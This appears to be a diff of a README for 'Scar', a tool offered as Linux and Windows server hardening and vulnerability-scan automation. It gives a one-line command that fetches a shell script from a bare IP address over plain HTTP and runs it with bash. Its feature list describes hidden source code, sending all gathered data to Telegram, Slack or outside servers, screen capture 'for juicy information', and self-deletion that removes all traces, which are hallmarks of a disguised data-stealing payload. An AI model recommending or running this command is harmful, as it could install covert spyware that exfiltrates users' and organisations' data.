@@ -3,16 +3,19 @@
 
 To run the Scar Use command: `wget http://161.117.85.147/tool/scar-installer.sh;chmod +x scar-installer.sh;bash scar-installer.sh`
 
-# Faetures of Scan Automation
-1. Ability to server hardening
-2. Infra level VA scan and automation
-3. Root Privilages escalation assessment automation
-4. Windows Server related SMB Shares Scan automation inbuilt  
-5. Load balancer with pipe ability to reduce the time to and CPU worker
-6. Anonymously install flexibility that gives you full encapsulation to hide the source code
-7. On fingertip installation with a single line of command
-8. Require a password to run the tool
-9. One-click feature to send all gathered information for the GAP Analysis 
-10. One-Click self-destructive feature that removes all traces of the installed tool
-11. One-time user password required to run all automation tasks
-12. many other features are in the Queue..
+# Faetures of Scar Automation
+1. Ability to reinforce a Linux server
+2. Infrastructure level Vulnerability Assessment digitalization and automation
+3. Automation of Level Evaluation of Root Privileges escalation
+4. Active Directory Security Configuration & Hardening Enhanced Automation
+5. SMB Shares Scan automation in constructed related to Windows Server
+6. Fully configurable load balancer with pipe capacity to reduce time and increase the effectiveness
+7. Anonymously install the flexibility which gives you complete encapsulation to mask the source code
+8. Set up at your fingertips with a single command line.
+9. Configurable functionality which requires a passphrase to execute the tool each time
+10. Built-in one-tab feature to send all gathered information to multiple cross-platforms like Telegram, On-premises server, Slack, and more for the GAP Analysis
+11. One-Tab Self-destructing function which removes all traces of the installed tool
+12. A single time password is needed for all automation tasks
+13. Built-in screen capture functionality for juicy information 
+14. Available across platforms such as Linux, Windows and macOS | on process
+15. Numerous other functions are in the queue
